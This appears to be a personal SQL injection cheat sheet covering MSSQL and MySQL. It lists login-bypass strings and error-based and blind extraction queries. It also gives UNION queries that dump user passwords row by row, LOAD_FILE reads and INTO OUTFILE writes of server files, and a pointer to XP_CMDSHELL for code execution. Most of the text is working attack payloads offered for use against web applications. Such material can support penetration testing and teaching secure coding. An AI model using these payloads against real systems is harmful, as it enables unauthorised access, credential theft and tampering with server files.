*SQLI Injection*

SQLI methodology
    Test error based sending ' " ; and look for errors.
    Test for boolean based sending ' or '1'='1 and look for differences. Other payloads:
        2' or '1'='1
        ' or 1=1 --
        a' or 1=1 --
        " or 1=1 --
        a" or 1=1 --
        ' or 1=1 #
        " or 1=1 #
        or 1=1 --
        ' or 'x'='x
        " or "x"="x
        ') or ('x'='x
        ") or ("x"="x
        ' or username LIKE '%admin%

MsSql attacks
    Group by + having can be used to specify a search condition for a group and aggregate the result.
        1. Sending ' having 1=1-- should produce column 'table.column1' is invalid...
        2. Sending ' group by table.column1 having 1=1--- should produce: column 'table.column2' is invalid...
        3. Sending ' group by table.column1,table.column2 HAVING 1=1-- should end up generating no error when you put all the columns.

    You can generate error and get debug info:
        Sending convert(int, @@version)-- should produce: failed when convering SQL Server ...
    Other payloads:
        convert(int,user_name())--
        convert(int, @@db_name())--

        If the DB runs as sa, you can run XP_CMDSHELL to get code execution.

Blind MsSqlI
    For numeric contexts (look for differences):
        and 1=1
        and 1=2

    Once we found the injection, we can leak data from the DB by guessing one character at a time as follows:
        AND ISNULL(ASCII(SUBSTRING(CAST((SELECT LOWER(db_name(0)))AS varchar(8000)),1,1)),0)=109
    if it is true, we know the db_name starts with 109 (m).

MySql injection, ORDERY BY operator
    Displays the result sorted by specific column name or number
    You can inject 'order by 10 #' and if the table has 10 or more tables it will order it, if it has less will throw error.

MySql injection, UNION operator
    Joins the result of two queries
        Two queries should return the same # of columns.
        Data-types in columns of the select must be of the same orcompatible type.
    Once you have the right number of columns (i.e. 3) you can find the mysql version:
        UNION SELECT @@version,NULL, NULL#'
    mysql users:
        UNION SELECT table_schema,NULL,NULL FROM information_schema.columns#'
    if the result displays garbage from the first query, you can add a false condition to only show the union result AND 1=0 UNION...
    Read files
        AND 1=0 UNION SELECT LOAD_FILE('C:\\boot.ini'),NULL,NULL #'
    Write files
        AND 1=0 UNION SELECT 'bad content',NULL,NULL INTO OUTFILE 'C:\\random_file.txt' #'

form to log in as admin
	' or ( 1=1 and username='admin');
	admin' --

Tricks to read data
    Exfiltrate the different rows of the table. First, find the number of rows in the table:
    *aa' UNION SELECT count(*), users.password FROM users; --*

    Then select each row:
    *aa' UNION SELECT users.password, users.password FROM users LIMIT 1; --*
    *aa' UNION SELECT users.password, users.password FROM users LIMIT 1 OFFSET 1; --*
    *aa' UNION SELECT users.password, users.password FROM users LIMIT 1 OFFSET 2; --*


    Exfiltrate the different rows of the table:
        *' or 'x'='x' order by 1 desc --
        ' or 'x'='x' order by 2 desc --
        ...*
